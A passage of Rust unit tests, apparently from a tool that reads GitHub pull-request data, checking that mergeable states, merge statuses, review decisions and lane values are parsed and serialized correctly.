        let pr = |n: u64, mergeable: Value| json!({ "url": format!("https://github.com/a/b/pull/{n}"), "mergeable": mergeable, "mergeStateStatus": "CLEAN" });
        let doc = json!({ "data": { "viewer": { "login": "me", "pullRequests": { "nodes": [pr(1, json!("MERGEABLE")), pr(2, json!(null))] } }, "reviews": { "nodes": [pr(3, json!("CONFLICTING"))] }, "assigned": { "nodes": [] } } });
        let snap = parse_snapshot(&doc).unwrap();
        assert_eq!(snap.mine[1].mergeable, Mergeable::Unknown);
        assert!(snap.settling);
        assert_eq!(snap.others[0].lane, Lane::Waiting);
    }

    #[test]
    fn github_enums_keep_the_strings_the_page_and_prompts_read() {
        let pr = to_pr(&json!({ "url": "u", "mergeable": "CONFLICTING", "mergeStateStatus": "HAS_HOOKS", "reviewDecision": "CHANGES_REQUESTED" }));
        let page = serde_json::to_value(&pr).unwrap();
        assert_eq!((&page["mergeable"], &page["mergeState"], &page["review"], &page["ci"]), (&json!("CONFLICTING"), &json!("HAS_HOOKS"), &json!("CHANGES_REQUESTED"), &json!("none")));
        let odd = to_pr(&json!({ "url": "u", "mergeStateStatus": "SOMETHING_NEW", "reviewDecision": "SOMETHING_NEW" }));
        assert_eq!((odd.merge_state, odd.review), (MergeState::Unknown, None));
        assert_eq!(serde_json::to_value(Lane::Checking).unwrap(), json!("checking"));
    }
}
